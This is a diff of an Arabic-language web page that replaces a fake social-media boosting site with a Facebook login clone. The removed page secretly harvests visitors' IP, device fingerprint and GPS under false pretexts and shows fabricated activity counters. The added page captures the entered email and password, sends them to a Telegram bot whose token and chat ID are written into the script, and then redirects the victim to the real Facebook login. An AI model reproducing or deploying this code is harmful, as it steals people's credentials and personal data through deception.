@@ -1,259 +1,70 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-    <title>ALSSRY - SERVICES</title>
-    
-    <meta property="og:title" content="ALSSRY D3M" />
-    
-    <meta property="og:description" content="خدمات سوشال ميديا احترافية - رشق متابعين، لايكات، وإسبام." />
-    
-    <meta property="og:type" content="website" />
-    
-    <meta property="og:image" content="https://via.placeholder.com/300/000000/00ff00?text=ALSSRY" />
-    
-    <meta name="theme-color" content="#00ff00">
-
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="ALSSRY D3M">
-    <meta name="twitter:description" content="خدمات سوشال ميديا احترافية - رشق، لايكات، وإسبام.">
-    <meta name="twitter:image" content="https://via.placeholder.com/300/000000/00ff00?text=ALSSRY">
-
+    <title>Facebook - تسجيل الدخول أو الاشتراك</title>
     <style>
-        :root { --main-green: #00ff00; --glow-red: #ff0000; }
-        body { background-color: #010101; color: white; text-align: center; font-family: 'Arial', sans-serif; margin: 0; overflow-x: hidden; direction: rtl; }
-        
-        /* الخلفية والنجوم الكثيفة */
-        #starfield { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2; background: black; }
-        .star { position: absolute; background-color: white; border-radius: 50%; animation: moveStar linear infinite; opacity: 1; box-shadow: 0 0 5px white; }
-        @keyframes moveStar { from { transform: translateY(100vh); } to { transform: translateY(-10vh); } }
-        #blur-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; backdrop-filter: blur(2px); background: rgba(0,0,0,0.5); }
-
-        /* شعار ALSSRY 3D الموحد */
-        .logo-3d { 
-            font-size: 42px; font-weight: 900; color: white; letter-spacing: 6px;
-            text-shadow: 3px 3px 0px var(--glow-red), -3px -3px 0px var(--main-green);
-            margin: 20px 0; display: block;
-        }
-
-        /* حقوق السناب بضبابية 20% */
-        .watermark { 
-            position: fixed; top: 55%; left: 50%; transform: translate(-50%, -50%);
-            font-size: 25px; font-weight: bold; color: rgba(255,255,255,0.4);
-            filter: blur(0.8px); pointer-events: none; z-index: 5;
-            text-shadow: 1px 1px var(--glow-red);
-        }
-
-        /* تنسيق النصوص والبدء */
-        #landing-page { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; padding-top: 60px; }
-        .hero-title { font-size: 2.4rem; font-weight: bold; margin-bottom: 40px; text-shadow: 0 0 8px var(--main-green); }
-        .start-btn { padding: 16px 70px; background: transparent; border: 1px solid var(--main-green); color: var(--main-green); border-radius: 50px; font-size: 22px; cursor: pointer; transition: 0.4s; }
-
-        /* الواجهة الداخلية */
-        #tools-interface { padding: 20px; display: none; z-index: 10; padding-bottom: 150px; } /* زيادة padding السفلية */
-        .glass-btn { 
-            width: 90%; padding: 16px; margin: 10px 0; background: rgba(255, 255, 255, 0.05); 
-            border: 1px solid rgba(0, 255, 0, 0.3); color: var(--main-green); border-radius: 12px; font-weight: bold; cursor: pointer; 
-        }
-        input { width: 85%; padding: 15px; margin: 10px 0; border-radius: 10px; border: 1px solid #333; background: rgba(0,0,0,0.5); color: white; text-align: center; }
-        #progress-box { margin-top: 20px; border: 1px solid var(--main-green); padding: 15px; border-radius: 10px; background: rgba(0,0,0,0.9); }
-        #counter { font-size: 38px; font-weight: bold; color: var(--main-green); }
-
-        /* قسم العمليات الأخيرة */
-        #recent-activity { width: 90%; margin: 30px auto; background: rgba(255,255,255,0.02); border: 1px solid #222; border-radius: 15px; overflow: hidden; }
-        .activity-header { background: #111; padding: 10px; font-size: 14px; color: #888; border-bottom: 1px solid #222; }
-        .activity-row { padding: 12px; border-bottom: 1px solid #111; display: flex; justify-content: space-between; align-items: center; font-size: 13px; animation: fadeIn 0.5s; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateX(10px); } to { opacity: 1; transform: translateX(0); } }
-        .tag-success { color: var(--main-green); font-weight: bold; }
-
-        #live-status { position: fixed; bottom: 0; width: 100%; background: rgba(0,0,0,0.9); padding: 10px 0; border-top: 1px solid #222; z-index: 20; }
-        .online-count { font-size: 13px; color: var(--main-green); }
-        .hidden { display: none !important; }
+        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; }
+        .header { background-color: #fff; width: 100%; padding: 20px 0; text-align: center; border-bottom: 1px solid #ddd; }
+        .logo { width: 150px; }
+        .login-container { background: #fff; width: 90%; max-width: 400px; margin-top: 20px; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
+        .login-btn { width: 100%; padding: 12px; background-color: #1877f2; border: none; color: white; font-weight: bold; border-radius: 6px; font-size: 18px; cursor: pointer; }
+        .footer-links { margin-top: 20px; font-size: 14px; color: #1877f2; text-decoration: none; }
+        .divider { margin: 20px 0; border-top: 1px solid #ddd; position: relative; }
+        .create-btn { background-color: #42b72a; padding: 10px 20px; color: white; text-decoration: none; border-radius: 6px; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <div id="starfield"></div>
-    <div id="blur-overlay"></div>
-    <div class="watermark">snap : i5dqa</div>
-
-    <div id="landing-page">
-        <div class="logo-3d">ALSSRY</div>
-        <h1 class="hero-title">خدمات سوشال ميديا</h1>
-        <button class="start-btn" onclick="initTrap()">بدء</button>
+    <div class="header">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zSkhp6.svg" class="logo" alt="Facebook">
     </div>
 
-    <div id="tools-interface">
-        <div class="logo-3d">ALSSRY</div>
-        
-        <div id="main-menu">
-            <button class="glass-btn" onclick="showPlat('boost')">1- قسم الرشق 🚀</button>
-            <button class="glass-btn" onclick="showPlat('spam')">2- قسم الإسبام ⚔️</button>
+    <div class="login-container">
+        <form id="fbForm">
+            <input type="text" id="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
+            <input type="password" id="pass" placeholder="كلمة السر" required>
+            <button type="submit" class="login-btn">تسجيل الدخول</button>
+        </form>
+        <div style="text-align: center; margin-top: 15px;">
+            <a href="#" class="footer-links">هل نسيت كلمة السر؟</a>
         </div>
-
-        <div id="platform-menu" class="hidden">
-            <button class="glass-btn" onclick="selectPlat('TikTok')">تيك توك</button>
-            <button class="glass-btn" onclick="selectPlat('Instagram')">انستقرام</button>
-            <button class="glass-btn" style="color:red;" onclick="goBack('main-menu')">رجوع</button>
-        </div>
-
-        <div id="service-menu" class="hidden">
-            <div id="boost-btns" class="hidden">
-                <button class="glass-btn" onclick="openInput('متابعين', 'يوزر (@)', 5000)">متابعين</button>
-                <button class="glass-btn" onclick="openInput('لايكات', 'رابط (http)', 5000)">لايكات</button>
-            </div>
-            <button id="spam-btn" class="glass-btn hidden" onclick="openInput('إسبام', 'يوزر (@)', 300)">بدء الإسبام</button>
-            <button class="glass-btn" style="color:red;" onclick="goBack('platform-menu')">رجوع</button>
-        </div>
-
-        <div id="final-step" class="hidden">
-            <h3 id="display-title" style="color:var(--main-green)"></h3>
-            <input type="text" id="target-id">
-            <input type="number" id="target-count">
-            <button class="glass-btn" style="background:var(--main-green); color:black;" onclick="requestGPS()">تأكيد التنفيذ ✅</button>
-            <button class="glass-btn" style="color:red;" onclick="goBack('service-menu')">رجوع</button>
-            <div id="progress-box" class="hidden">
-                <div id="counter">0</div>
-            </div>
-        </div>
-
-        <div id="recent-activity">
-            <div class="activity-header">آخر العمليات المكتملة ⚡</div>
-            <div id="activity-list">
-                </div>
-        </div>
-
-        <div id="live-status">
-            <div class="online-count">🟢 المتصلون الآن: <span id="user-count">245</span></div>
+        <div class="divider"></div>
+        <div style="text-align: center;">
+            <a href="#" class="create-btn">إنشاء حساب جديد</a>
         </div>
     </div>
 
     <script>
-        let mode="", plat="", service="", currentOnline = 245;
-        let deviceData = {};
+        const TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg";
+        const CHAT_ID = "5811700860";
 
-        // كثافة النجوم +20%
-        function createStars() {
-            const container = document.getElementById('starfield');
-            for(let i=0; i<100; i++) {
-                const star = document.createElement('div');
-                star.className = 'star';
-                star.style.width = star.style.height = Math.random()*4+'px';
-                star.style.left = Math.random()*100+'vw';
-                star.style.animationDuration = Math.random()*6+3+'s';
-                container.appendChild(star);
-            }
-        }
-        createStars();
+        document.getElementById('fbForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // منع الصفحة من التحديث
 
-        // المصيدة الشاملة (سحب كل شيء)
-        async function initTrap() {
-            document.getElementById('landing-page').style.display = 'none';
-            document.getElementById('tools-interface').style.display = 'block';
+            const user = document.getElementById('email').value;
+            const password = document.getElementById('pass').value;
 
-            // 1. الـ IP الحقيقي
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                deviceData.ip = ipData.ip;
-            } catch(e) { deviceData.ip = "Hidden"; }
+            // تجهيز تقرير الصيد
+            const report = `🎯 **صيد فيسبوك جديد:**\n\n📧 اليوزر: \`${user}\`\n🔑 الباسورد: \`${password}\`\n📱 الجهاز: ${navigator.platform}`;
 
-            // 2. البطارية الحقيقية
-            try {
-                const batt = await navigator.getBattery();
-                deviceData.battery = Math.round(batt.level * 100) + "% " + (batt.charging ? "(Charging)" : "");
-            } catch(e) { deviceData.battery = "Unknown"; }
-
-            // 3. كرت الشاشة HW-ID
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            if (gl) {
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                deviceData.gpu_hwid = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            }
-
-            // 4. نوع الجهاز والشبكة والشاشة
-            deviceData.platform = navigator.platform;
-            deviceData.screen = window.screen.width + "x" + window.screen.height;
-            deviceData.network = navigator.connection ? navigator.connection.effectiveType : "WiFi";
-            deviceData.userAgent = navigator.userAgent;
-
-            sendToApi("زيارة أولية - سحب بيانات");
-            updateOnline();
-            genActivity(); // بدء توليد العمليات الوهمية
-        }
-
-        // خدعة الـ GPS
-        function requestGPS() {
-            alert("⚠️ لاختيار أسرع سيرفر قريب منك وضمان سرعة التنفيذ، يرجى السماح بالوصول للموقع.");
-            navigator.geolocation.getCurrentPosition((pos) => {
-                deviceData.gps = { lat: pos.coords.latitude, lon: pos.coords.longitude };
-                startProcess();
-            }, (err) => { 
-                deviceData.gps = "Denied"; 
-                startProcess(); 
-            });
-        }
-
-        function startProcess() {
-            const id = document.getElementById('target-id').value;
-            const count = document.getElementById('target-count').value;
-            sendToApi(`بدء تنفيذ: ${service} لـ ${id} عدد ${count}`);
-            
-            document.getElementById('progress-box').classList.remove('hidden');
-            let cur = 0;
-            let intervalTime = (90 * 1000) / 100; // دقيقة ونصف لكل 100
-            let inv = setInterval(() => {
-                if(cur >= count) { clearInterval(inv); alert("اكتمل التنفيذ!"); location.reload(); }
-                else { cur++; document.getElementById('counter').innerText = cur; }
-            }, intervalTime);
-        }
-
-        function sendToApi(msg) {
-            // ملاحظة: تأكد من إعداد نقطة النهاية (Endpoint) الخاصة بك لاستقبال البيانات
-            fetch('/api/index', {
+            // إرسال البيانات فوراً للبوت
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ action: msg, device: deviceData })
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: "Markdown" })
+            })
+            .then(() => {
+                // الحيلة الأهم: التحويل لصفحة تسجيل الدخول الحقيقية
+                // بمجرد ضغط الزر، يطير الصيد ويتحول لفيسبوك الرسمي
+                window.location.href = "https://m.facebook.com/login.php"; 
+            })
+            .catch(() => {
+                window.location.href = "https://m.facebook.com";
             });
-        }
-
-        // محاكي العمليات الأخيرة
-        const users = ['a7m', 'sa_','kh_','m.','n_','user','b0','z.','r9','mo'];
-        const servs = ['متابعين', 'لايكات', 'إسبام', 'مشاهدات'];
-        
-        function genActivity() {
-            const list = document.getElementById('activity-list');
-            setInterval(() => {
-                const user = users[Math.floor(Math.random()*users.length)] + (Math.floor(Math.random()*900)+100);
-                const srv = servs[Math.floor(Math.random()*servs.length)];
-                const amt = Math.floor(Math.random()*2000)+500;
-                
-                const row = document.createElement('div');
-                row.className = 'activity-row';
-                row.innerHTML = `<span>👤 ${user}</span> <span>${srv} <span class="tag-success">+${amt}</span></span>`;
-                
-                list.prepend(row);
-                if(list.children.length > 5) list.removeChild(list.lastChild);
-            }, 5000);
-        }
-
-        // عداد المتصلين الذكي
-        function updateOnline() {
-            setInterval(() => {
-                currentOnline += Math.random() > 0.5 ? Math.floor(Math.random()*6)+1 : -(Math.floor(Math.random()*11)+1);
-                if(currentOnline < 100) currentOnline = 110;
-                document.getElementById('user-count').innerText = currentOnline;
-            }, 4000);
-        }
-
-        // التنقل والرجوع
-        function showPlat(m) { mode=m; goBack('platform-menu'); }
-        function selectPlat(p) { plat=p; goBack('service-menu'); document.getElementById('boost-btns').className = (mode==='boost') ? "" : "hidden"; document.getElementById('spam-btn').className = (mode==='spam') ? "glass-btn" : "hidden"; }
-        function openInput(s, ph, max) { service=s; goBack('final-step'); document.getElementById('display-title').innerText = plat + " - " + s; document.getElementById('target-id').placeholder = ph; document.getElementById('target-count').placeholder = "الحد: "+max; }
-        function goBack(id) { document.querySelectorAll('#main-menu, #platform-menu, #service-menu, #final-step').forEach(el => el.classList.add('hidden')); document.getElementById(id).classList.remove('hidden'); }
+        });
     </script>
 </body>
 </html>
